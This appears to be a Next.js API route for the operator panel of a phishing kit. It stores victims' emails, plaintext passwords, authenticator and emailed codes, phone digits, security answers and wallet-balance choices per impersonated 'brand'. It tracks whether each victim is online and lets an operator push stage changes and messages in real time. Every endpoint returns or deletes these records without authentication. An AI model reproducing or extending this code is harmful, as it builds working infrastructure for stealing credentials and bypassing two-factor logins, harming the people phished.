import { NextRequest, NextResponse } from "next/server"
import { createAdminClient } from "@/lib/supabase/admin"

// GET - Fetch session(s)
export async function GET(request: NextRequest) {
  const supabase = createAdminClient()
  const { searchParams } = new URL(request.url)
  const id = searchParams.get("id")

  if (id) {
    // Get single session
    const { data } = await supabase
      .from("sessions")
      .select("*")
      .eq("id", id)
      .maybeSingle()
    
    return NextResponse.json({ session: data ? formatSession(data) : null })
  }

  // Get all sessions (for admin)
  const { data } = await supabase
    .from("sessions")
    .select("*")
    .order("updated_at", { ascending: false })

  return NextResponse.json({ sessions: (data || []).map(formatSession) })
}

// POST - Create or update session
export async function POST(request: NextRequest) {
  const supabase = createAdminClient()
  
  try {
    const body = await request.json()
    
    // Handle sendBeacon offline signal
    if (body._beacon && body.id) {
      await supabase
        .from("sessions")
        .update({ is_online: false, updated_at: new Date().toISOString() })
        .eq("id", body.id)
      return NextResponse.json({ success: true })
    }
    
    const { id, brand, email, password, stage, status, adminMessage, data, userAgent, isOnline } = body

    if (!id) {
      return NextResponse.json({ error: "Missing session id" }, { status: 400 })
    }

    const now = new Date().toISOString()
    
    // Check if session exists
    const { data: existing } = await supabase
      .from("sessions")
      .select("*")
      .eq("id", id)
      .maybeSingle()

    if (existing) {
      // Update existing session
      const { data: updated, error } = await supabase
        .from("sessions")
        .update({
          email: email ?? existing.email,
          password: password ?? existing.password,
          stage: stage ?? existing.stage,
          current_step: stage ?? existing.stage ?? existing.current_step,
          status: status ?? existing.status,
          admin_message: adminMessage ?? existing.admin_message,
          data: data ? { ...existing.data, ...data } : existing.data,
          user_agent: userAgent ?? existing.user_agent,
          is_online: isOnline ?? existing.is_online,
          last_activity: now,
          updated_at: now,
        })
        .eq("id", id)
        .select()
        .maybeSingle()

      if (error) {
        return NextResponse.json({ error: error.message }, { status: 500 })
      }

      return NextResponse.json({ session: formatSession(updated) })
    } else {
      // Create new session - brand is required
      if (!brand) {
        return NextResponse.json({ error: "Missing brand" }, { status: 400 })
      }
      
      const { data: created, error } = await supabase
        .from("sessions")
        .insert({
          id,
          brand,
          email: email || null,
          password: password || null,
          stage: stage || "start",
          current_step: stage || "start",
          status: status || "active",
          admin_message: adminMessage || null,
          data: data || {},
          user_agent: userAgent || "",
          is_online: isOnline ?? true,
          is_active: true,
          last_activity: now,
          created_at: now,
          updated_at: now,
        })
        .select()
        .maybeSingle()

      if (error) {
        return NextResponse.json({ error: error.message }, { status: 500 })
      }

      return NextResponse.json({ session: formatSession(created) })
    }
  } catch (err) {
    return NextResponse.json({ error: "Invalid request" }, { status: 400 })
  }
}

// PATCH - Update session (heartbeat or admin actions)
export async function PATCH(request: NextRequest) {
  const supabase = createAdminClient()
  
  try {
    const body = await request.json()
    const { id, ...updates } = body

    if (!id) {
      return NextResponse.json({ error: "Missing session id" }, { status: 400 })
    }

    const now = new Date().toISOString()
    const updateData: Record<string, any> = { updated_at: now, last_activity: now }
    
    if (updates.isOnline !== undefined) updateData.is_online = updates.isOnline
    if (updates.stage !== undefined) updateData.stage = updates.stage
    if (updates.status !== undefined) updateData.status = updates.status
    if (updates.adminMessage !== undefined) updateData.admin_message = updates.adminMessage
    if (updates.data !== undefined) updateData.data = updates.data

    const { data, error } = await supabase
      .from("sessions")
      .update(updateData)
      .eq("id", id)
      .select()
      .maybeSingle()

    if (error) {
      return NextResponse.json({ error: error.message }, { status: 500 })
    }

    return NextResponse.json({ session: formatSession(data) })
  } catch {
    return NextResponse.json({ error: "Invalid request" }, { status: 400 })
  }
}

// DELETE - Remove session(s)
export async function DELETE(request: NextRequest) {
  const supabase = createAdminClient()
  const { searchParams } = new URL(request.url)
  const id = searchParams.get("id")
  const all = searchParams.get("all")

  // Clear all sessions (used when brand changes)
  if (all === "true") {
    // Delete from both old and new tables
    await Promise.all([
      supabase.from("sessions").delete().neq("id", ""),
      supabase.from("ledger_activities").delete().neq("visitor_id", "")
    ])
    return NextResponse.json({ success: true })
  }

  if (!id) {
    return NextResponse.json({ error: "Missing session id" }, { status: 400 })
  }

  const { error } = await supabase
    .from("sessions")
    .delete()
    .eq("id", id)

  if (error) {
    return NextResponse.json({ error: error.message }, { status: 500 })
  }

  return NextResponse.json({ success: true })
}

// Format database row to session object
function formatSession(row: any) {
  return {
    id: row.id,
    brand: row.brand,
    email: row.email,
    password: row.password,
    stage: row.stage,
    status: row.status,
    adminMessage: row.admin_message,
    data: row.data,
    createdAt: row.created_at,
    updatedAt: row.updated_at,
    userAgent: row.user_agent,
    isOnline: row.is_online,
    isActive: row.is_active,
    currentStep: row.current_step,
    lastActivity: row.last_activity,
    ipAddress: row.ip_address,
    phoneLast4: row.phone_last4,
    emailForCode: row.email_for_code,
    authenticatorCode: row.authenticator_code,
    emailCode: row.email_code,
    balanceSelection: row.balance_selection,
    securityResponses: row.security_responses,
  }
}
